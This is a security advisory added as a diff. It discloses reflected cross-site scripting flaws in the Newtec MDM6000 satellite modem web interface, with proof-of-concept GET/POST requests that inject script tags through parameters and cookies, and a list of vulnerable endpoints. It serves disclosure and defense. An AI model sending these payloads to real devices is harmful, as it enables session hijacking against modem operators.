@@ -1,0 +1,70 @@
+
+Newtec Satellite Modem MDM6000 2.2.5 Cross-Site Scripting Vulnerability
+
+
+Vendor: Newtec Cy N.V.
+Product web page: http://www.newtec.eu
+Affected version: 2.2.5.67852
+                  2.2.4.64193
+                  1.3.8.56435
+
+Summary: The MDM6000 modem is typically installed at both ends
+of a point-to-point satellite link or at the remote sites of a
+star network. The unit can work as a modulator, demodulator or
+modem depending on the network configuration and integrates
+seamlessly with terrestrial IP networks and equipment. The modem
+is in full compliance with the DVB-S2 and DVB-S2X standards to
+achieve barrier-breaking efficiency at maximum service availability.
+
+Desc: Newtec Satellite Modem MDM6000 suffers from multiple reflected
+cross-site scripting vulnerabilities when input passed via several
+parameters to several scripts is not properly sanitized before being
+returned to the user. This can be exploited to execute arbitrary HTML
+and script code in a user's browser session in context of an affected
+site.
+
+Tested on: lighttpd/1.4.28
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5359
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5359.php
+
+
+20.06.2016
+
+--
+
+
+Payload: "><script>alert(1)</script>
+
+Params: value, args, URI.
+Cookie: ext-pogui-tasks, token.
+
+PoCs:
+
+GET /cgi-bin/pogui/view/validate/GuiTreeViewDecapsulationTSDecapsulation/Decapsulation-TSDecapsulation-DecapsulationPIDs/123?value="><script>alert(1)</script> HTTP/1.1
+GET /cgi-bin/pogui/view/execute/tasks/calibration-nonlinearequalink-manual?args="><script>alert(2)</script> HTTP/1.1
+POST /cgi-bin/pogui/auth/login"><script>alert(3)</script> HTTP/1.1
+Cookie: token=expert-8816866; ext-pogui-tasks=o%3a"><script>alert(4)</script>; ext-pogui-alarms=o%3A
+Cookie: token=expert-8816866"><script>alert(5)</script>; ext-pogui-tasks=o%3A; ext-pogui-alarms=o%3A
+
+
+Can be triggered in:
+
+/cgi-bin/pogui/auth/login
+/cgi-bin/pogui/view/alarms
+/cgi-bin/pogui/view/create/GuiTreeViewDecapsulationTSDecapsulation/Decapsulation-TSDecapsulation-DecapsulationPIDs
+/cgi-bin/pogui/view/execute/alarms/clearAllAlarmCounters
+/cgi-bin/pogui/view/execute/tasks/calibration-nonlinearequalink-manual
+/cgi-bin/pogui/view/GuiLedView
+/cgi-bin/pogui/view/GuiSynopticViewAUPCControllerDetailedView
+/cgi-bin/pogui/view/GuiTreeViewDeviceSetupControlPlaneEncapsulatorConfiguration
+/cgi-bin/pogui/view/synoptic
+/cgi-bin/pogui/view/update/GuiTreeViewEncapsulationTestTrafficGeneratorConfiguration/TestTrafficGenerator-Configuration-Enable
+/cgi-bin/pogui/view/update/GuiTreeViewDecapsulationTSDecapsulation/Decapsulation-TSDecapsulation-DecapsulationPIDs/123
+/cgi-bin/pogui/view/validate/GuiTreeViewDecapsulationTSDecapsulation/Decapsulation-TSDecapsulation-DecapsulationPIDs
+/cgi-bin/pogui/view/validate/GuiTreeViewDecapsulationTSDecapsulation/Decapsulation-TSDecapsulation-DecapsulationPIDs/123
